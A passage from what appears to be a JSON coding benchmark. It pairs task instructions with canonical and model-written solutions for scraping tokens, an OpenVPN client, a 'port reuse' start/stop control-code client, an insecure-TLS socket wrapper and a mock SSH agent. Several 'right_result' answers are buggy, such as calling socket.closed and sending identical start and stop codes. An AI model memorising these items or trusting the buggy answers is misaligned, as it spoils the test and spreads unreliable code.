APIResponseError(f\"{'odin_tt'} \u5185\u5bb9\u4e0d\u7b26\u5408\u8981\u6c42\")\n                return odin_tt\n            except httpx.RequestError as exc:\n                raise APIConnectionError(f\"\u8bf7\u6c42\u7aef\u70b9\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u5f53\u524d\u7f51\u7edc\u73af\u5883\u3002\u94fe\u63a5\uff1a{self.odin_tt_conf['url']}\uff0c\u4ee3\u7406\uff1a{self.proxies}\uff0c\u5f02\u5e38\u7c7b\u540d\uff1a{self.__class__.__name__}\uff0c\u5f02\u5e38\u8be6\u7ec6\u4fe1\u606f\uff1a{exc}\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 58,
    "right_result": "import httpx\nimport yaml\nimport random\nimport string\n\nclass TokenManager:\n    def __init__(self):\n        with open(\"config.yaml\", \"r\") as f:\n            self.config = yaml.safe_load(f)\n        self.token_conf = self.config[\"token_conf\"]\n        self.ttwid_conf = self.config[\"ttwid_conf\"]\n        self.odin_tt_conf = self.config[\"odin_tt_conf\"]\n        self.proxies = self.config.get(\"proxies\", {})\n\n    def gen_real_msToken(self):\n        headers = self.token_conf[\"headers\"]\n        payload = self.token_conf[\"payload\"]\n        url = self.token_conf[\"url\"]\n        try:\n            with httpx.Client(proxies=self.proxies) as client:\n                response = client.post(url, headers=headers, json=payload)\n                response.raise_for_status()\n                return response.json().get(\"token\")\n        except Exception as e:\n            print(f\"Failed to generate real msToken: {e}\")\n            return None\n\n    def gen_false_msToken(self):\n        return ''.join(random.choices(string.ascii_letters + string.digits, k=32))\n\n    def gen_ttwid(self, cookie):\n        url = self.ttwid_conf[\"url\"]\n        data = self.ttwid_conf[\"data\"]\n        try:\n            with httpx.Client(proxies=self.proxies) as client:\n                response = client.post(url, data=data, cookies=cookie)\n                response.raise_for_status()\n                return response.json().get(\"ttwid\")\n        except Exception as e:\n            print(f\"Failed to generate ttwid: {e}\")\n            return None\n\n    def gen_odin_tt(self):\n        url = self.odin_tt_conf[\"url\"]\n        try:\n            with httpx.Client(proxies=self.proxies) as client:\n                response = client.get(url)\n                response.raise_for_status()\n                return response.json().get(\"odin_tt\")\n        except Exception as e:\n            print(f\"Failed to generate odin_tt: {e}\")\n            return None"
  },
  {
    "Task_id": 370,
    "Instruction": "Task Description: Create a TCP client class for interacting with an OpenVPN server, capable of establishing connections, sending commands, receiving data, and closing connections.\n\nClass Description: The OpenVPNTCPClient class provides functionality to connect to an OpenVPN server via TCP, send commands, receive responses, and manage the connection lifecycle.\n\nAttributes:\n- host: str - The IP address or hostname of the OpenVPN server\n- port: int - The port number on which the OpenVPN server is listening\n- timeout: int - Connection and operation timeout in seconds (default: 10)\n- socket: socket.socket - The TCP socket object used for communication\n\nMethods:\n- connect() -> bool - Establishes a TCP connection to the OpenVPN server. Returns True on success, False on failure.\n- send_command(command: str) -> bool - Sends a command to the connected OpenVPN server. Returns True on success, False on failure.\n- receive_data() -> list[bytes] | None - Receives data from the server until an 'END' marker is encountered. Returns list of received lines or None on error.\n- close() -> bool - Closes the TCP connection. Returns True on success, False on failure.\n- get_status() -> list[bytes] | None - Executes a complete status request cycle (connect, send 'status' command, receive response, close). Returns received data or None on error.",
    "Canonical_solution": "import socket\n\nclass OpenVPNTCPClient:\n    def __init__(self, host, port, timeout=10):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.socket = None\n\n    def connect(self):\n        try:\n            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.socket.settimeout(int(self.timeout))\n            self.socket.connect((self.host, self.port))\n            return True\n        except socket.error as e:\n            return False\n\n    def send_command(self, command):\n        try:\n            self.socket.send(command + '\\r\\n')\n            return True\n        except socket.error as e:\n            return False\n\n    def receive_data(self):\n        try:\n            fd = self.socket.makefile('rb')\n            lines = []\n            while True:\n                line = fd.readline()\n                lines.append(line)\n                if line.strip() == 'END':\n                    break\n            return lines\n        except socket.error as e:\n            return None\n\n    def close(self):\n        try:\n            if self.socket:\n                self.socket.close()\n            return True\n        except socket.error:\n            return False\n\n    def get_status(self):\n        if not self.connect():\n            return None\n        \n        if not self.send_command('status'):\n            self.close()\n            return None\n        \n        data = self.receive_data()\n        self.close()\n        \n        return data",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\n\nclass OpenVPNTCPClient:\n    def __init__(self, host: str, port: int, timeout: int = 10):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.socket = None\n\n    def connect(self) -> bool:\n        try:\n            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.socket.settimeout(self.timeout)\n            self.socket.connect((self.host, self.port))\n            return True\n        except Exception as e:\n            print(f\"Connection failed: {e}\")\n            return False\n\n    def send_command(self, command: str) -> bool:\n        if not self.socket or self.socket.closed:\n            return False\n        try:\n            self.socket.sendall(command.encode('utf-8') + b'\\n')\n            return True\n        except Exception as e:\n            print(f\"Send command failed: {e}\")\n            return False\n\n    def receive_data(self) -> list[bytes] | None:\n        if not self.socket or self.socket.closed:\n            return None\n        data = []\n        try:\n            while True:\n                chunk = self.socket.recv(1024)\n                if not chunk:\n                    break\n                data.append(chunk)\n                if b'END' in chunk:\n                    break\n            return data\n        except Exception as e:\n            print(f\"Receive data failed: {e}\")\n            return None\n\n    def close(self) -> bool:\n        if not self.socket or self.socket.closed:\n            return False\n        try:\n            self.socket.close()\n            return True\n        except Exception as e:\n            print(f\"Close connection failed: {e}\")\n            return False\n\n    def get_status(self) -> list[bytes] | None:\n        if not self.connect():\n            return None\n        if not self.send_command(\"status\"):\n            self.close()\n            return None\n        data = self.receive_data()\n        self.close()\n        return data"
  },
  {
    "Task_id": 372,
    "Instruction": "Task Description: Implement a TCP client function that communicates with a server to send specific control codes derived from a secret key, with options to start or stop port reuse.\n\nFunction Description: The function establishes a TCP connection to a specified server, generates two MD5 checkcodes from a secret, combines portions of them to create a final checkcode, extracts control codes from this checkcode, and sends either a start or stop command based on the action parameter. It handles connection errors gracefully and closes the connection after sending the command.\n\nInput:\n- ip: [str] - The IP address of the target server\n- port: [str/int] - The port number of the target server\n- action: [str] - Either \"start\" or \"stop\" to determine which control code to send\n\nOutput:\n- None (prints status messages to console)\n- Prints \"[*] Cannot connect to target\" if connection fails\n- Prints \"[*] Done!\" when operation completes (successfully or after handling failure)",
    "Canonical_solution": "import socket\nimport hashlib\n\nSECRET = \"\"\n\ndef tcp_client_communication(ip, port, action):\n    first_checkcode = hashlib.md5(SECRET.encode()).hexdigest()\n    second_checkcode = hashlib.md5(first_checkcode.encode()).hexdigest()\n    final_checkcode = first_checkcode[:24] + second_checkcode[:24]\n\n    START_PORT_REUSE = final_checkcode[16:32]\n    STOP_PORT_REUSE = final_checkcode[32:]\n\n    data = START_PORT_REUSE if action == \"start\" else STOP_PORT_REUSE\n\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(2)\n        s.connect((ip, int(port)))\n        s.send(data.encode())\n    except:\n        print(\"[*] Cannot connect to target\")\n\n    try:\n        s.recv(1024)\n    except:\n        pass\n\n    s.close()\n    print(\"[*] Done!\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport hashlib\n\ndef tcp_client(ip, port, action):\n    try:\n        # Create a TCP socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(5)  # Set a timeout for the connection attempt\n\n        # Connect to the server\n        sock.connect((ip, int(port)))\n        print(\"[*] Connected to target\")\n\n        # Generate two MD5 checkcodes from a secret key\n        secret_key = \"secret_key\"\n        md5_1 = hashlib.md5(secret_key.encode()).hexdigest()\n        md5_2 = hashlib.md5(secret_key.encode()).hexdigest()\n\n        # Combine portions of the MD5 checkcodes to create a final checkcode\n        combined_checkcode = md5_1[:16] + md5_2[16:]\n\n        # Extract control codes from the combined checkcode\n        control_code = combined_checkcode[:8]\n\n        # Send the control code based on the action\n        if action == \"start\":\n            sock.sendall(control_code.encode())\n            print(\"[*] Start command sent\")\n        elif action == \"stop\":\n            sock.sendall(control_code.encode())\n            print(\"[*] Stop command sent\")\n        else:\n            print(\"[*] Invalid action. Please use 'start' or 'stop'.\")\n            return\n\n    except ConnectionRefusedError:\n        print(\"[*] Cannot connect to target\")\n    except Exception as e:\n        print(f\"[*] An error occurred: {str(e)}\")\n    finally:\n        # Close the connection\n        if 'sock' in locals() and sock:\n            sock.close()\n            print(\"[*] Done!\")"
  },
  {
    "Task_id": 376,
    "Instruction": "Task Description: Create a thread-safe TCP socket wrapper class that handles connection management, data transmission, and SSL/TLS encryption with proper resource cleanup.\n\nClass Description: SafeStreamSocket is a robust socket wrapper that provides safe connection handling, unique socket identification, and SSL/TLS capabilities. It manages socket lifecycle including proper cleanup and supports both IPv4 and Unix domain sockets.\n\nAttributes:\n_id: [int] - Unique identifier for the socket instance\n_dup_sock: [socket.socket] - Duplicate socket used during SSL/TLS handshake\n_name: [str] - Optional name identifier for the socket\n_sock: [socket.socket] - Main socket connection object\n_finalizer: [weakref.finalize] - Weak reference finalizer for cleanup\n_id_numbers: [class attribute, list[int]] - Tracks all active socket IDs\n_n: [class attribute, list[int]] - Counter for generating unique IDs\n\nMethods:\n__init__: [constructor](addr: Union[str, Tuple[str, int], socket.socket, Any]) -> None - Initializes socket connection with the given address\n_acquire_uid: [_acquire_uid]() -> int - Generates a unique ID for the socket instance\n_connect: [_connect](addr: Union[str, Tuple[str, int], socket.socket, Any]) -> socket.socket - Establishes connection to the specified address\n_cleanup: [_cleanup]() -> None - Performs cleanup operations when socket is closed\n_release_uid: [_release_uid](id: int) -> None - Releases the socket ID when closed\nclose: [close]() -> None - Closes the socket connection\nclosed: [property]() -> bool - Returns whether socket is closed\nid: [property]() -> int - Returns socket ID\nname: [property]() -> str - Gets socket name\nname: [setter](new_name: str) -> None - Sets socket name\nget_socket: [get_socket]() -> socket.socket - Returns underlying socket object\nrecv: [recv](bufsize: int = 4096) -> bytes - Receives data from socket\nrecvall: [recvall](size: int) -> bytearray - Receives exact amount of data\nsendall: [sendall](data: Union[bytes, bytearray]) -> int - Sends all data through socket\nswitch_to_ssl: [switch_to_ssl](pemfile: str) -> None - Upgrades connection to SSL/TLS\n__enter__: [__enter__]() -> SafeStreamSocket - Context manager entry\n__exit__: [__exit__](*args) -> None - Context manager exit",
    "Canonical_solution": "import logging\nimport os\nimport socket\nimport ssl\nimport threading\nimport typing\nimport weakref\nfrom typing import Any, Union\n\nclass SafeStreamSocket:\n    def __init__(self, addr: Union[str, typing.Tuple[str, int], socket.socket, Any]):\n        self._id = self._acquire_uid()\n        self._dup_sock = None\n        self._name = None\n        self._sock = self._connect(addr)\n        self._finalizer = weakref.finalize(self, self._cleanup)\n\n    def _acquire_uid(self) -> int:\n        with threading.Lock():\n            self._id_numbers.append(self._n[0])\n            _id = self._n[0]\n            self._n[0] += 1\n        logging.debug(\"Opening socket: id=%d\", _id)\n        return _id\n\n    def _connect(self, addr: Union[str, typing.Tuple[str, int], socket.socket, Any]) -> socket.socket:\n        if isinstance(addr, socket.socket):\n            return addr\n        if isinstance(addr, str):\n            if ':' in addr:\n                host, port = addr.split(\":\", 1)\n                addr = (host, int(port))\n                family = socket.AF_INET\n            elif os.path.exists(addr):\n                family = socket.AF_UNIX\n            else:\n                raise SocketError(f\"socket unix:{addr} unable to connect\")\n        else:\n            family = socket.AF_INET\n        sock = socket.socket(family, socket.SOCK_STREAM)\n        sock.connect(addr)\n        return sock\n\n    def _cleanup(self):\n        self._release_uid(self.id)\n        sock = self._dup_sock or self._sock\n        try:\n            sock.shutdown(socket.SHUT_RDWR)\n        except OSError:\n            pass\n        sock.close()\n\n    def _release_uid(self, id: int):\n        try:\n            self._id_numbers.remove(id)\n        except ValueError:\n            pass\n        logging.debug(\"Closing socket, id=%d\", id)\n\n    def close(self):\n        self._finalizer()\n\n    @property\n    def closed(self) -> bool:\n        return not self._finalizer.alive\n\n    @property\n    def id(self) -> int:\n        return self._id\n\n    @property\n    def name(self) -> str:\n        return self._name\n\n    @name.setter\n    def name(self, new_name: str):\n        self._name = new_name\n\n    def get_socket(self) -> socket.socket:\n        return self._sock\n\n    def recv(self, bufsize: int = 4096) -> bytes:\n        try:\n            return self._sock.recv(bufsize)\n        except socket.timeout as e:\n            raise SocketError(\"socket timeout\") from e\n        except ssl.SSLError as e:\n            raise SocketError(\"ssl error\") from e\n        except Exception as e:\n            raise SocketError(\"socket error\") from e\n\n    def recvall(self, size: int) -> bytearray:\n        buf = bytearray()\n        while len(buf) < size:\n            chunk = self.recv(size-len(buf))\n            if not chunk:\n                raise SocketError(\"recvall: socket connection broken\")\n            buf.extend(chunk)\n        return buf\n\n    def sendall(self, data: Union[bytes, bytearray]) -> int:\n        try:\n            return self._sock.sendall(data)\n        except Exception as e:\n            raise SocketError(\"sendall error\") from e\n\n    def switch_to_ssl(self, pemfile):\n        context = ssl.SSLContext(ssl.PROTOCOL_TLS)\n        try:\n            context.verify_mode = ssl.CERT_NONE\n            context.set_ciphers(\"ALL:@SECLEVEL=0\")\n        except ssl.SSLError:\n            pass\n        self._dup_sock = self._sock.dup()\n        context.load_cert_chain(pemfile, keyfile=pemfile)\n        context.check_hostname = False\n        self._sock = context.wrap_socket(self._sock, server_hostname=\"iphone.localhost\")\n\n    def __enter__(self):\n        return self\n\n    def __exit__(self, *args):\n        self.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport ssl\nimport weakref\nfrom typing import Union, Tuple, Any, List, Optional\n\nclass SafeStreamSocket:\n    _id_numbers = []\n    _n = 0\n\n    def __init__(self, addr: Union[str, Tuple[str, int], socket.socket, Any]) -> None:\n        self._id = self._acquire_uid()\n        self._dup_sock = None\n        self._name = None\n        self._sock = self._connect(addr)\n        self._finalizer = weakref.finalize(self, self._cleanup)\n        self._closed = False\n\n    def _acquire_uid(self) -> int:\n        self._n += 1\n        self._id_numbers.append(self._n)\n        return self._n\n\n    def _connect(self, addr: Union[str, Tuple[str, int], socket.socket, Any]) -> socket.socket:\n        if isinstance(addr, socket.socket):\n            sock = addr\n        else:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            if isinstance(addr, tuple):\n                sock.connect(addr)\n            else:\n                sock.connect(addr)\n        return sock\n\n    def _cleanup(self) -> None:\n        if not self._closed:\n            self.close()\n\n    def _release_uid(self, id: int) -> None:\n        if id in self._id_numbers:\n            self._id_numbers.remove(id)\n\n    def close(self) -> None:\n        if not self._closed:\n            self._closed = True\n            self._finalizer.__call__()\n            self._sock.close()\n\n    @property\n    def closed(self) -> bool:\n        return self._closed\n\n    @property\n    def id(self) -> int:\n        return self._id\n\n    @property\n    def name(self) -> str:\n        return self._name\n\n    @name.setter\n    def name(self, new_name: str) -> None:\n        self._name = new_name\n\n    def get_socket(self) -> socket.socket:\n        return self._sock\n\n    def recv(self, bufsize: int = 4096) -> bytes:\n        return self._sock.recv(bufsize)\n\n    def recvall(self, size: int) -> bytearray:\n        data = b''\n        while len(data) < size:\n            packet = self._sock.recv(size - len(data))\n            if not packet:\n                break\n            data += packet\n        return data\n\n    def sendall(self, data: Union[bytes, bytearray]) -> int:\n        return self._sock.sendall(data)\n\n    def switch_to_ssl(self, pemfile: str) -> None:\n        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\n        context.load_cert_chain(certfile=pemfile)\n        self._dup_sock = context.wrap_socket(self._sock, server_side=False)\n        self._sock = self._dup_sock\n\n    def __enter__(self) -> \"SafeStreamSocket\":\n        return self\n\n    def __exit__(self, *args) -> None:\n        self.close()"
  },
  {
    "Task_id": 377,
    "Instruction": "Task Description: Create a TCP/UDP/RAW socket server class that can handle incoming connections, receive data, and optionally send responses. The server should support different protocols (TCP, UDP, RAW) and provide methods for single interaction or receiving until a specific pattern is matched.\n\nClass Description: MiniTestServer is a versatile socket server implementation that supports TCP, UDP, and RAW packet protocols. It can operate in silent mode (only receiving) or respond to clients, and includes timeout handling for operations.\n\nAttributes:\n- server_socket: [socket.socket] - The underlying socket object\n- received: [bytes] - The last received data from a client\n- data_to_send: [bytes] - Default data to send in response (default: b\"\\xfe\\xeb\\xda\\xed\")\n- active_port: [int] - The port number the server is bound to\n- stay_silent: [bool] - If True, server won't send responses (default: False)\n- proto: [str] - Protocol type ('tcp', 'udp', or 'raw') (default: 'tcp')\n- host: [str] - Host address to bind to (default: '0.0.0.0')\n- timeout: [int] - Operation timeout in seconds (default: 5)\n\nMethods:\n- __init__(stay_silent=False, proto=\"tcp\", host=\"0.0.0.0\") -> None - Initializes the server with optional parameters\n- bind() -> None - Creates and binds the socket according to the specified protocol\n- serve_once() -> None - Handles a single client interaction (receive and optionally send)\n- receive_until(expected) -> None - (RAW only) Receives data until matching expected pattern or timeout",
    "Canonical_solution": "import socket\nimport threading\nimport time\n\nclass MiniTestServer:\n    def __init__(self, stay_silent=False, proto=\"tcp\", host=\"0.0.0.0\"):\n        self.server_socket = None\n        self.received = None\n        self.data_to_send = b\"\\xfe\\xeb\\xda\\xed\"\n        self.active_port = None\n        self.stay_silent = stay_silent\n        self.proto = proto\n        self.host = host\n        self.timeout = 5\n\n    def bind(self):\n        if self.proto == \"tcp\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        elif self.proto == \"udp\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        elif self.proto == \"raw\":\n            self.server_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))\n        else:\n            raise Exception(\"Invalid protocol type: '{0}'\".format(self.proto))\n\n        self.server_socket.bind((self.host, 0))\n        if self.proto == \"tcp\":\n            self.server_socket.listen(1)\n        self.active_port = self.server_socket.getsockname()[1]\n\n    def serve_once(self):\n        self.server_socket.settimeout(self.timeout)\n\n        if self.proto == \"tcp\":\n            (client_socket, address) = self.server_socket.accept()\n            self.received = client_socket.recv(10000)\n            if not self.stay_silent:\n                client_socket.send(self.data_to_send)\n            client_socket.close()\n        elif self.proto == \"udp\":\n            data, addr = self.server_socket.recvfrom(1024)\n            self.received = data\n            if not self.stay_silent:\n                self.server_socket.sendto(self.data_to_send, addr)\n        elif self.proto == \"raw\":\n            data, addr = self.server_socket.recvfrom(10000)\n            self.received = data\n            if not self.stay_silent:\n                self.server_socket.sendto(self.data_to_send, addr)\n        else:\n            raise Exception(\"Invalid protocol type: '{0}'\".format(self.proto))\n\n        self.server_socket.close()\n        self.server_socket = None\n        self.active_port = None\n\n    def receive_until(self, expected):\n        self.server_socket.settimeout(self.timeout)\n\n        if self.proto == \"raw\":\n            elapsed_time = 0\n            start_time = time.time()\n            while elapsed_time < self.timeout:\n                self.server_socket.settimeout(self.timeout - elapsed_time)\n                try:\n                    data, addr = self.server_socket.recvfrom(10000)\n                    if data == expected:\n                        self.received = data\n                        if not self.stay_silent:\n                            self.server_socket.sendto(self.data_to_send, addr)\n                        break\n                except socket.timeout:\n                    break\n                elapsed_time = time.time() - start_time\n        else:\n            raise Exception(\"Invalid protocol type: '{0}'\".format(self.proto))\n\n        self.server_socket.close()\n        self.server_socket = None\n        self.active_port = None",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\n\nclass MiniTestServer:\n    def __init__(self, stay_silent=False, proto=\"tcp\", host=\"0.0.0.0\"):\n        self.server_socket = None\n        self.received = b\"\"\n        self.data_to_send = b\"\\xfe\\xeb\\xda\\xed\"\n        self.active_port = 0\n        self.stay_silent = stay_silent\n        self.proto = proto\n        self.host = host\n        self.timeout = 5\n\n    def bind(self):\n        if self.proto == \"tcp\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        elif self.proto == \"udp\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        elif self.proto == \"raw\":\n            self.server_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)\n        else:\n            raise ValueError(\"Invalid protocol type\")\n        self.server_socket.settimeout(self.timeout)\n        self.server_socket.bind((self.host, self.active_port))\n\n    def serve_once(self):\n        if self.proto == \"tcp\":\n            self.server_socket.listen(1)\n            client_socket, addr = self.server_socket.accept()\n            try:\n                self.received = client_socket.recv(1024)\n                if not self.stay_silent:\n                    client_socket.send(self.data_to_send)\n            finally:\n                client_socket.close()\n        elif self.proto == \"udp\":\n            data, addr = self.server_socket.recvfrom(1024)\n            self.received = data\n            if not self.stay_silent:\n                self.server_socket.sendto(self.data_to_send, addr)\n        elif self.proto == \"raw\":\n            data = self.server_socket.recv(1024)\n            self.received = data\n            if not self.stay_silent:\n                self.server_socket.send(self.data_to_send)\n\n    def receive_until(self, expected):\n        if self.proto != \"raw\":\n            raise ValueError(\"receive_until is only supported for RAW protocol\")\n        while True:\n            data = self.server_socket.recv(1024)\n            if expected in data:\n                self.received = data\n                break\n            if not data:\n                break"
  },
  {
    "Task_id": 378,
    "Instruction": "Task Description: Implement a mock SSH agent that simulates the behavior of a real SSH agent, handling client requests for key management and authentication. The agent should support Unix domain sockets for IPC and provide functionality to start, stop, and manage client connections.\n\nClass Description: The `MockSSHAgent` class simulates an SSH agent that can load an ED25519 private key, handle client connections, and respond to SSH agent protocol requests. It uses threading to handle multiple clients and supports graceful shutdown.\n\nAttributes:\n\n- `sock_path`: [str] - The path to the Unix domain socket used for communication.\n- `server_sock`: [socket.socket] - The server socket object for accepting client connections.\n- `running`: [threading.Event] - A threading event to control the agent's running state.\n- `keys`: [list] - A list of tuples containing key information (key_type, key_blob, comment).\n- `agent_thread`: [threading.Thread] - The thread handling client connections.\n\nMethods:\n\n- `_load_ed25519_private_key(private_key_path: str) -> tuple`: Loads an ED25519 private key from a file and returns a tuple containing key information (key_type, key_blob, comment).\n- `start_agent(sock_path: str) -> None`: Starts the SSH agent by creating a Unix domain socket, binding it, and listening for client connections. Sets the `SSH_AUTH_SOCK` environment variable.\n- `_accept_connections() -> None`: Continuously accepts client connections and delegates handling to `_handle_client`.\n- `_handle_client(client_sock: socket.socket) -> None`: Handles a client connection by processing incoming messages and sending appropriate responses.\n- `_mock_list_keys_response() -> bytes`: Constructs a mock response to the `SSH_AGENTC_REQUEST_IDENTITIES` request.\n- `stop_agent() -> None`: Stops the SSH agent by sending a stop command, cleaning up resources, and removing the socket file.",
    "Canonical_solution": "import os\nimport socket\nimport struct\nimport threading\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey\n\nSSH_AGENTC_REQUEST_IDENTITIES = 11\nSSH_AGENT_IDENTITIES_ANSWER = 12\nSSH_AGENT_FAILURE = 5\nSTOP_REQUEST = 0xFF\n\nclass MockSSHAgent:\n    def __init__(self, private_key_path):\n        self.sock_path = None\n        self.server_sock = None\n        self.running = threading.Event()\n        self.keys = [self._load_ed25519_private_key(private_key_path)]\n        self.agent_thread = None\n\n    def _load_ed25519_private_key(self, private_key_path):\n        with open(private_key_path, 'rb') as key_file:\n            private_key = serialization.load_ssh_private_key(key_file.read(), password=None)\n\n        if not isinstance(private_key, Ed25519PrivateKey):\n            raise ValueError(\"Invalid key type, expected ED25519 private key.\")\n\n        public_key = private_key.public_key()\n        public_key_blob = public_key.public_bytes(\n            encoding=serialization.Encoding.Raw, format=serialization.PublicFormat.Raw\n        )\n\n        key_type = b\"ssh-ed25519\"\n        key_blob_full = (\n            struct.pack(\">I\", len(key_type))\n            + key_type\n            + struct.pack(\">I\", len(public_key_blob))\n            + public_key_blob\n        )\n\n        comment = \"\"\n        return (\"ssh-ed25519\", key_blob_full, comment)\n\n    def start_agent(self, sock_path):\n        self.sock_path = sock_path\n        if os.path.exists(self.sock_path):\n            os.remove(self.sock_path)\n\n        self.server_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n        self.server_sock.bind(self.sock_path)\n        self.server_sock.listen(5)\n\n        os.environ['SSH_AUTH_SOCK'] = self.sock_path\n        self.running.set()\n\n        self.agent_thread = threading.Thread(target=self._accept_connections, daemon=True)\n        self.agent_thread.start()\n\n    def _accept_connections(self):\n        while self.running.is_set():\n            try:\n                client_sock, _ = self.server_sock.accept()\n                self._handle_client(client_sock)\n            except Exception as e:\n                print(f\"Error accepting connection: {e}\")\n\n    def _handle_client(self, client_sock):\n        try:\n            length_message = client_sock.recv(4)\n            if not length_message:\n                raise \"no length message received\"\n\n            msg_len = struct.unpack(\">I\", length_message)[0]\n            request_message = client_sock.recv(msg_len)\n\n            if request_message[0] == STOP_REQUEST:\n                client_sock.close()\n                self.running.clear()\n                return\n\n            if request_message[0] == SSH_AGENTC_REQUEST_IDENTITIES:\n                response = self._mock_list_keys_response()\n                client_sock.sendall(response)\n            else:\n                response = struct.pack(\">I\", 1) + struct.pack(\">B\", SSH_AGENT_FAILURE)\n                client_sock.sendall(response)\n\n        except socket.error:\n            pass\n        finally:\n            client_sock.close()\n\n    def _mock_list_keys_response(self):\n        response = struct.pack(\">B\", SSH_AGENT_IDENTITIES_ANSWER)\n        response += struct.pack(\">I\", len(self.keys))\n\n        for key_type, key_blob, comment in self.keys:\n            response += struct.pack(\">I\", len(key_blob)) + key_blob\n            comment_encoded = comment.encode()\n            response += struct.pack(\">I\", len(comment_encoded)) + comment_encoded\n\n        response = struct.pack(\">I\", len(response)) + response\n        return response\n\n    def stop_agent(self):\n        if self.running.is_set():\n            with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as client_sock:\n                client_sock.connect(self.sock_path)\n                stop_command = struct.pack(\">B\", STOP_REQUEST)\n                message_length = struct.pack(\">I\", len(stop_command))\n                client_sock.sendall(message_length)\n                client_sock.sendall(stop_command)\n\n            self.running.clear()\n\n            if self.agent_thread:\n                self.agent_thread.join()\n                self.agent_thread = None\n\n            if self.server_sock:\n                self.server_sock.close()\n                os.remove(self.sock_path)",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport threading\nimport os\nimport sys\n\nclass MockSSHAgent:\n    def __init__(self, sock_path):\n        self.sock_path = sock_path\n        self.server_sock = None\n        self.running = threading.Event()\n        self.keys = []\n        self.agent_thread = None\n\n    def _load_ed25519_private_key(self, private_key_path: str) -> tuple:\n        # Mock key loading logic\n        with open(private_key_path, 'r') as f:\n            key_data = f.read()\n        return ('ed25519', key_data.encode(), 'mock-key')\n\n    def start_agent(self, sock_path: str) -> None:\n        self.sock_path = sock_path\n        self.server_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n        try:\n            os.remove(self.sock_path)\n        except OSError:\n            pass\n        self.server_sock.bind(self.sock_path)\n        self.server_sock.listen(5)\n        os.environ['SSH_AUTH_SOCK'] = self.sock_path\n        self.running.set()\n        self.agent_thread = threading.Thread(target=self._accept_connections)\n        self.agent_thread.start()\n\n    def _accept_connections(self) -> None:\n        while self.running.is_set():\n            client_sock, client_addr = self.server_sock.accept()\n            threading.Thread(target=self._handle_client, args=(client_sock,)).start()\n\n    def _handle_client(self, client_sock: socket.socket) -> None:\n        try:\n            while self.running.is_set():\n                data = client_sock.recv(1024)\n                if not data:\n                    break\n                # Mock processing of SSH agent protocol requests\n                if data.startswith(b'SSH_AGENTC_REQUEST_IDENTITIES'):\n                    response = self._mock_list_keys_response()\n                    client_sock.sendall(response)\n                else:\n                    # Mock response for unknown commands\n                    client_sock.sendall(b'00000000')\n        except Exception as e:\n            print(f\"Error handling client: {e}\")\n        finally:\n            client_sock.close()\n\n    def _mock_list_keys_response(self) -> bytes:\n        response = b'\\x00\\x00\\x00\\x04'\n        for key_type, key_blob, comment in self.keys:\n            response += len(key_type).to_bytes(1, 'big')\n            response += key_type.encode()\n            response += len(key_blob).to_bytes(1, 'big')\n            response += key_blob\n            response += len(comment).to_bytes(1, 'big')\n            response += comment.encode()\n        return response\n\n    def stop_agent(self) -> None:\n        self.running.clear()\n        if self.server_sock:\n            self.server_sock.close()\n            os.remove(self.sock_path)"
  },
  {
    "Task_id": 379,
    "Instruction": "Task Description: Implement a TCP communication class to facilitate data exchange between a Python server and a Godot client using JSON format for message serialization.\n\nClass Description: GodotTCPCommunicator is a TCP server implementation that handles communication with a Godot client. It establishes a connection, sends/receives JSON-formatted messages, and manages the connection lifecycle.\n\nAttributes:\n- port: int - The port number on which the server listens for connections (default: 11008)\n- connection: socket.socket - The active TCP connection with the client\n- DEFAULT_PORT: int - Class constant for default port (11008)\n- DEFAULT_TIMEOUT: int - Class constant for default timeout in seconds (60)\n\nMethods:\n- __init__(port: int = DEFAULT_PORT) -> None - Initializes the communicator with specified port and starts the server\n- _start_server() -> socket.socket - Creates and configures TCP socket, binds to localhost, listens for and accepts connection\n- _send_as_json(dictionary: Dict[str, Any]) -> None - Serializes dictionary to JSON and sends it to client\n- _get_json_dict() -> Dict[str, Any] - Receives data from client and deserializes JSON to dictionary\n- _get_data() -> Optional[str] - Receives raw string data from client with length-prefix protocol\n- _send_string(string: str) -> None - Sends string to client with length-prefix protocol\n- close() -> None - Closes the active connection",
